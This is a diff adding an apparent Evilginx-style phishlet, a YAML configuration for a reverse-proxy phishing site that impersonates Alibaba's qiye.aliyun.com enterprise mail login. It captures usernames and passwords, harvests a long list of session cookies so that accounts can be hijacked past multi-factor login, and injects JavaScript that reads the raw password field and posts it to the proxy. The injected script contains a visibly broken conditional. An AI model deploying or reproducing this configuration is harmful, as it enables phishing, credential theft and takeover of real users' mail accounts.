@@ -1,0 +1,76 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'qiye', orig_sub: 'qiye', domain: 'aliyun.com', session: true, is_landing: true, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'aliyun.com', orig_sub: 'qiye', domain: 'aliyun.com', search: 'qiye.aliyun.com', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json','text/javascript'], trigger_paths: ['/']}
+  - {triggers_on: 'aliyun.com', orig_sub: 'qiye', domain: 'aliyun.com', search: 'name="username"', replace: 'name="username" value="{username}"', mimes: ['text/html', 'application/json','text/javascript'], trigger_paths: ['/']}
+  - {triggers_on: 'aliyun.com', orig_sub: 'qiye', domain: 'aliyun.com', search: 'name="password"', replace: 'name="password" value="{password}"', mimes: ['text/html', 'application/json','text/javascript'], trigger_paths: ['/']}
+
+auth_tokens:
+  - domain: 'qiye.aliyun.com'
+    keys: ['JSESSIONID', '_csrf_token_', 'alimail_auth_mode', 'alimail_auth_session_key', 'alimail_browser_instance', 'alimail_core_session_key', 'alimail_device_id', 'alimail_device_id_type', 'alimail_init_lang', 'alimail_sdata0', 'alimail_session_template_key', 'alimail_session_version_key', 'alimail_sid', 'alimail_sso_device_id', 'alimail_sso_td', 'arms_uid', 'at', 'cna', 'core_heart_beat', 'oauth_login_mode', 'sca', 'tmp0', 'udtoken']
+    type: 'cookie'
+  - domain: '.aliyun.com'
+    keys: ['JSESSIONID', '_csrf_token_', 'alimail_auth_mode', 'alimail_auth_session_key', 'alimail_browser_instance', 'alimail_core_session_key', 'alimail_device_id', 'alimail_device_id_type', 'alimail_init_lang', 'alimail_sdata0', 'alimail_session_template_key', 'alimail_session_version_key', 'alimail_sid', 'alimail_sso_device_id', 'alimail_sso_td', 'arms_uid', 'at', 'cna', 'core_heart_beat', 'oauth_login_mode', 'sca', 'tmp0', 'udtoken']
+    type: 'cookie'
+  - domain: 'aliyun.com'
+    keys: ['JSESSIONID', '_csrf_token_', 'alimail_auth_mode', 'alimail_auth_session_key', 'alimail_browser_instance', 'alimail_core_session_key', 'alimail_device_id', 'alimail_device_id_type', 'alimail_init_lang', 'alimail_sdata0', 'alimail_session_template_key', 'alimail_session_version_key', 'alimail_sid', 'alimail_sso_device_id', 'alimail_sso_td', 'arms_uid', 'at', 'cna', 'core_heart_beat', 'oauth_login_mode', 'sca', 'tmp0', 'udtoken']
+    type: 'cookie'
+
+auth_urls:
+  - '/alimail'
+  - '/alimail/ajax'
+
+credentials:
+  username:
+    key: ''
+    search: '"userEmail":"([^"]+)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]+)"'
+    type: 'json'
+  #csrf:
+    #key: '_csrf_token_'
+    #search: '([^&]+)'
+    #type: 'url'
+
+login:
+  domain: 'qiye.aliyun.com'
+  path: '/'
+  redirect_url: 'https://qiye.aliyun.com/alimail'
+
+js_inject:
+  - trigger_domains: ["qiye.aliyun.com"]
+    trigger_paths: ["/login/v2/index?"]
+    trigger_params: ["email"]
+    script: |
+           function sendRawPassword() {
+           var passwordInput = document.querySelector('[data-testid="password"]');
+           if (!passwordInput)
+           var password = passwordInput.value;
+           if (!password) {
+           console.error('Пароль не может быть пустым!');
+           return;
+           }
+           console.log('password:', password);
+           var xhr = new XMLHttpRequest();
+           xhr.open("POST", '/', true);
+           xhr.setRequestHeader("Content-Type", "application/json");
+           xhr.send(JSON.stringify({ unenc_password: password }));
+           xhr.onload = function() {
+           if (xhr.status === 200) {
+            console.log('password!');
+           } else {
+            console.error('password:', xhr.statusText);
+           }
+           };
+            }
+
+           document.querySelector('input[type="submit"]').addEventListener("click", function(event) {
+           event.preventDefault();
+           sendRawPassword();
+           });
